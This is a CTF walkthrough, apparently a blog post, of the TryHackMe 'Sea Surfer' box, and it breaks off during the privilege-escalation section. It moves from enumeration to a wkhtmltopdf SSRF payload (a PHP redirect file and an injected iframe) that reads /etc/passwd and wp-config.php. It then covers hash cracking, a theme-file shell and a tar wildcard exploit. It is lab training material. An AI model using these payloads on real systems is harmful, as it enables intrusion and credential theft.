**---
title: "TryHackMe: Sea Surfer"
date: 05 Jul 2022 @ 0507
excerpt_separator: "<!--more-->"
categories:
  - Walkthrough
tags:
  - Linux
  - Web
  - THM
---
# Summary
Some stuff
# Walkthrough
## Enumeration
### Nmap
Nmap showed only two ports open, SSH on port 22 and HTTP on port 80. 

```bash
$ sudo nmap -sC -sV -p- -vv -oA nmap/$name $ip

Nmap scan report for seasurfer.thm (10.10.143.75)
Host is up, received reset ttl 61 (0.21s latency).
Scanned at 2022-07-06 18:29:08 CDT for 1282s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 3C7EB80E10B984F4C265DB2AB1197E69
|_http-generator: WordPress 5.9.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea Surfer &#8211; Ride the Wave!
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Initial look at the website
Looking at the web page on port 80 gives us a default Ubuntu Apache2 page. 

![](../assets/images/Pasted%20image%2020220717190418.png)

Before we do anything else, we can check the headers to see if there's anything interesting there. 

>**TIP:** You can also accomplish this by proxying all your traffic through a web proxy like Burp or ZAP, but this will work for now. 

### Checking the HTTP headers with cURL
```bash
$ curl -I http://$ip
```

The `X-Backend-Server` header gives us a hostname. Add that hostname to the `/etc/hosts` file. 

```bash
HTTP/1.1 200 OK
Date: Wed, 06 Jul 2022 22:51:07 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Sun, 17 Apr 2022 18:54:09 GMT
ETag: "2aa6-5dcde2b3f2ff9"
Accept-Ranges: bytes
Content-Length: 10918
Vary: Accept-Encoding
X-Backend-Server: seasurfer.thm
Content-Type: text/html
```

### Browsing to the website
After adding `seasurfer.thm` to our `/etc/hosts` file, we're able to browse to the website. Scrolling down a bit we find an "About" section that introduces the team. Make note of these names since they may come in handy later on. 

![](assets/images/Pasted%20image%2020220706175628.png)

Further down the site, there is a blog section. This is an illustration of why it's important (especially in CTF-type boxes like this) to review each blog post whenever you come across one. On one of the posts, there is a comment from `brandon` asking about not being able to connect to `intrenal.seasurfer.thm`. 

![](assets/images/Pasted%20image%2020220706175834.png)

Looks like our guy Brandon can't spell. Ten bucks says he meant to type `internal.seasurfer.thm`. Let's add that to our `/etc/hosts` file, but we're going to hold off on that for a moment. Before we get too far down this path, let's do some directory brute forcing to see if there's any other resources we might be able to use. 

### Fuzzing
As always, I'm using `ffuf` for this, but feel free to use whatever you like. 

```bash
$ ffuf -c -u http://seasurfer.thm/FUZZ -w /opt/wordlists/SecLists/Discovery/Web-Content/big.txt -fs 0

[...]
adminer                 [Status: 301, Size: 316, Words: 20, Lines: 10]
[...]
```

Looks like there's an `adminer` instance on the box. Adminer is essentially a database management frontend. 

![](../assets/images/Pasted%20image%2020220717194157.png)

We don't have credentials, so make note of this and we'll come back to it. There were also the usual Wordpress suspects, `wp-admin`, `wp-includes`, etc. We'll leave them alone right now too. 

While we're here, let's fuzz for any other subdomains or virtual hosts to make sure we've found everything there is and we're not leaving any functionality untested. 

```bash
$ ffuf -c -u http://seasurfer.thm/ -w /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.seasurfer.thm" -fw 3499

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://seasurfer.thm/
 :: Wordlist         : FUZZ: /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.seasurfer.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response words: 3499
________________________________________________

internal                [Status: 200, Size: 3072, Words: 225, Lines: 109]
[...]
```

So `internal` is the only virtual host. 

**NOW** we can start digging into the functionality on `internal.seasurfer.thm`. 

### Receipt generator
Bingo! We're in. Once we navigate to `internal.seasurfer.thm` we find a receipt generator.

![](../assets/images/Pasted%20image%2020220717191520.png)

I don't have any idea what this actually does, other than "create receipts", so we can play around with it a bit to get an idea of its functionality. After entering some nonsense in the fields and clicking "Create receipt", we're shown a PDF. 

![](../assets/images/Pasted%20image%2020220717191723.png)

Very interesting. The receipt is reflecting the data we input in the form back to us. We might be able to use this for some sort of *evil*. 

![](../assets/images/Pasted%20image%2020220717191923.png)

### Details of PDF file
There are other ways to do this, but an easy way to get the details of the PDF generator is to just enter some junk data in the fields and generate the receipt. Once it's created, download it and use `exiftool` to view the data. 

```bash
$ exiftool 18072022-q1RBVtGgw2noGHrzXElp.pdf 

ExifTool Version Number         : 12.16
File Name                       : 18072022-q1RBVtGgw2noGHrzXElp.pdf
Directory                       : .
File Size                       : 52 KiB
File Modification Date/Time     : 2022:07:17 19:12:10-05:00
File Access Date/Time           : 2022:07:17 19:12:10-05:00
File Inode Change Date/Time     : 2022:07:17 19:12:10-05:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : Receipt
Creator                         : wkhtmltopdf 0.12.5
Producer                        : Qt 4.8.7
Create Date                     : 2022:07:18 00:11:40Z
Page Count                      : 1
```

Here we can see it's using `wkhtmltopdf v.0.12.5` on the backend to create the PDF. 

## Vulnerability research
### SSRF to Local File Read
I found this [website](http://hassankhanyusufzai.com/SSRF-to-LFI/) that details a Server-Side Request Forgery (SSRF) to Local File Read attack against `wkhtmltopdf`. 

### Payload
I created the following file and called it `ssrf.php`. 

```php
<?php header('location:file://'.$_REQUEST['url']); ?>
```

I hosted that file from my attacking machine using a PHP webserver.

> **TIP:** It's important to use a web server that supports PHP, otherwise the PHP code will not execute. The normal Python3 web server will not work for this exploit. 

To start a PHP web server, execute the following command:

```bash
$ sudo php -S 0.0.0.0:80
```

We can test the exploit using the following payload in the "Additional Information" field. Other fields work as well, but I used the additional information field. 

```bash
"><iframe height="2000" width="800" src=http://<YOUR THM VPN IP>/ssrf.php?url=%2fetc%2fpasswd></iframe>
```

When I click "Create Receipt", I can read the contents of the `/etc/passwd`. 

![](assets/images/Pasted%20image%2020220706182244.png)

After some trial and error, I found the Wordpress document root was at `/var/www/wordpress`. From there, I was able to grab the `wp-config.php` file. 

![](assets/images/Pasted%20image%2020220706184217.png)

## Exploit
Now that we have the database credentials, we can go back to the `adminer` instance we found earlier during directory fuzzing and try to log in. After logging in and navigating to the `wp_users` table, we find a username and password hash for `kyle`. 

Checking `hashid` shows this hash is a Wordpress hash (Shocker!) and gives us the John the Ripper format (`phpass`). The Hashcat mode is 400. 

![](assets/images/Pasted%20image%2020220706184600.png)

To figure out what kind of hash this is, we can use something like `hashid` as follows. 

```bash
$ hashid -jm '$P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/'

Analyzing '$P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/'
[+] Wordpress ≥ v2.6.2 [Hashcat Mode: 400][JtR Format: phpass]
[+] Joomla ≥ v2.5.18 [Hashcat Mode: 400][JtR Format: phpass]
[+] PHPass' Portable Hash [Hashcat Mode: 400][JtR Format: phpass]
```

So we know we need to use the `phpass` format with John. After a minute or two, the hash cracks and we get Kyle's password. We can use this to log into the Wordpress admin panel. 

```bash
$ john --wordlist=/opt/wordlists/rockyou.txt --format=phpass kyle.hash 

[...]
REDACTED       (?)     
[...] 
```

During our initial enumeration we found a bunch of Wordpress resources, including the `wp-admin` login page. We can try using that now that we have some credentials. 

![](assets/images/Pasted%20image%2020220706191031.png)

Edit the twentyseventeen 404 theme file

![](assets/images/Pasted%20image%2020220706191357.png)

Navigate to a site that isn't there

![](assets/images/Pasted%20image%2020220706191523.png)

Get a shell

![](assets/images/Pasted%20image%2020220706191553.png)

This looks like an interesting file

![](assets/images/Pasted%20image%2020220706192344.png)

Looking at backup.sh

```bash
#!/bin/bash

# Brandon complained about losing _one_ receipt when we had 5 minutes of downtime, set this to run every minute now >:D
# Still need to come up with a better backup system, perhaps a cloud provider?

cd /var/www/internal/invoices
tar -zcf /home/kyle/backups/invoices.tgz *

```

This script moves into the `/var/www/internal/invoices/` directory and compresses all the contents in that directory into a file named `invoices.tgz` in Kyle's home directory. 

Detail tar wildcard exploit. Get a shell as Kyle

![](assets/images/Pasted%20image%2020220706193431.png)

## Privilege Escalation to Root
Checking `linpeas.sh` output, we see a red marking under `SUDO TOKENS` that `ptrace` is disabled. Checking the associated HackTricks entry [here](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens) we can see reusing sudo tokens is an attack we can use when we have a shell as a user with sudo permissions but we don't know that user's password. That article outlines several criteria for this attack to work.
- 